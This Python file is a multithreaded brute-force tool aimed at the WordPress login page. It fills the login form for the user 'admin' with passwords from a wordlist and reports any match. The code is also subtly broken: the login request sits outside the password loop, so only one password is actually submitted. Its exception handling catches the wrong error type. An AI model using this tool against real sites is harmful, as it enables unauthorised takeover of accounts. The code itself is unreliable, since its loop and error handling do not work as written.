import threading
import time
from queue import Queue

import requests
from bs4 import BeautifulSoup


SUCCESS = 'Welcome to WordPress!'
TARGET_URL = None
WORDLIST = None


def get_words():
    """
    Get words from the wordlist file and add them to a thread-safe queue.
    """
    with open(WORDLIST) as wordlist:
        raw_words = wordlist.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words


def get_params(web_page):
    """
    Find all parameters in the login form that we need to fill out.
    """
    params = dict()
    tree = BeautifulSoup(web_page, 'html.parser')
    for element in tree.find_all('input'):
        try:
            name = element['name']
        except ValueError:
            name = None

        if name is not None:
            try:
                params[name] = element['value']
            except ValueError:
                params[name] = None
    return params


class Bruter:
    """
    The main class to perform bruteforcing.
    """

    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f"\nBrute Force Attack begins on {url}.\n")

    def run_bruteforce(self, passwords):
        """
        Start brute-forcing.
        """
        for _ in range(10):
            bruteforce_thread = threading.Thread(target=self.web_bruter,
                                                 args=(passwords, ))
            bruteforce_thread.start()

    def web_bruter(self, passwords):
        """
        Try one pair of username:password.
        Return the pair if successful.
        """
        session = requests.Session()
        response_0 = session.get(self.url)
        params = get_params(response_0.text)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f"Trying {self.username}:{passwd:<10}")
            params['pwd'] = passwd

        response_1 = session.post(self.url, data=params)
        if SUCCESS in response_1.text:
            self.found = True
            print("\nBruteforcing successful.")
            print(f"Username is {self.username}.")
            print(f"Password is {passwd}.")


if __name__ == '__main__':
    words = get_words()
    bruter = Bruter('admin', TARGET_URL)
    bruter.run_bruteforce(words)
